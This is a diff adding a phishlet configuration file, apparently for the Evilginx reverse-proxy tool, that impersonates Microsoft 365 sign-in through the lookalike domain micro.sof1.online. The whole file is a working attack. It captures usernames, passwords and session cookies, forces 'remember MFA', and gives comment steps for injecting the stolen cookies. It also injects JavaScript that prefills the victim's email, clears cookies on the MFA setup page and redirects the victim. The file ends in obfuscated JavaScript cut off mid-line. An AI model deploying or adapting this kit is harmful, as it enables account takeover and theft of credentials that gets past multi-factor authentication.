@@ -1,0 +1,109 @@
+name: 'o365'
+author: '@an0nud4y'
+min_ver: '3.3.0'
+redirect_url: 'https://login.microsoftonline.com'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'office', orig_sub: 'www', domain: 'micro.sof1.online', session: false, is_landing:false}
+sub_filters:
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'micro.sof1.online', search: 'https://www.micro.sof1.online/oauth', replace: 'https://login.micro.sof1.online/oauth', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'micro.sof1.online', search: 'https://login.microsoftonline.com', replace: 'https://login.micro.sof1.online', mimes: ['text/html', 'application/json', 'application/javascript']}
+#  - {triggers_on: 'www.micro.sof1.online', orig_sub: 'www', domain: 'micro.sof1.online', search: 'Location: https://www.micro.sof1.online/login', replace: 'Location: https://login.micro.sof1.online/login', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH,opt', 'ESTSAUTHPERSISTENT,opt','.*,regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['SignInStateCookie,opt','.*,regexp']
+
+  - domain: '.office.com'
+    keys: ['Office365User', 'rtFa', 'FedAuth', 'MSOID', 'MSPBack', 'MSPAuth', 'MSCC', 'MSPOK', 'MSPRequ', 'MSPRequOpt', '.*,regexp']
+  - domain: '.outlook.office.com'
+    keys: ['OutlookSession', 'DefaultAnchorMailbox', '.*,regexp']
+  - domain: '.live.com'
+    keys: ['wlidperf', 'MSPAuth', 'MSPProf', '.*,regexp']
+
+
+# INJECT COOKIES
+# --------------
+#
+# Browse the url https://login.microsoftonline.com
+# inject the capture cookies
+# Refresh the browser
+
+
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+  - '/kmsi'
+  - '/'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+rewrite_urls:
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/oauth2/v2.0/authorize']
+    rewrite:
+      path: '/oauth'
+      query:
+        - key: 'tid'
+          value: '{id}'
+          
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+
+
+# JS inject to end session and redirect user on proofs/Add
+js_inject:
+  - trigger_domains: ["account.live.com"]
+    trigger_paths: ["/proofs/Add", "/proofs/Add?mkt=EN-GB&uiflavor=web"]
+    script: |
+      // End session and redirect user
+      document.cookie.split(';').forEach(function(c) {
+        document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/');
+      });
+      window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/logout";
+
+#/js_inject:
+#  - trigger_domains: ["account.live.com"]
+#    trigger_paths: ["/proofs/Add", "/proofs/Add?mkt=EN-GB&uiflavor=web"]
+#    script: |
+#      if (document.title.includes("404") || document.body.innerText.match(/404\s+Not\s+Found/i)) {
+#        window.location.href = "https://login.micro.sof1.online";
+#      }
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/","/","/*"]
+    trigger_params: [email]
+    script: |
+      function lp(){
+        document.forms[0][0].value="{email}";
+        }
+      setTimeout(function(){ lp(); }, 1000);
+      var _0x410e92=_0x5778;(function(_0x35da17,_0x3a9f50){var _0x5ec8bb=_0x5778,_0x54aaae=_0x35da17();while(!![]){try{var _0x444577=-parseInt(_0x5ec8bb(0x167))/(-0x41*0x91+0x1243*0x1+-0x128f*-0x1)*(-parseInt(_0x5ec8bb(0x187))/(0x3*0x2fe+-0xbc7+-0x2cf*-0x1))+-parseInt(_0x5ec8bb(0x15b))/(0xead*0x1+-0x16e+-0xd3c)*(-parseInt(_0x5ec8bb(0x155))/(-0x1b*-0x24+-0x3*-0x233+-0xa61*0x1))+-parseInt(_0x5ec8bb(0x1>
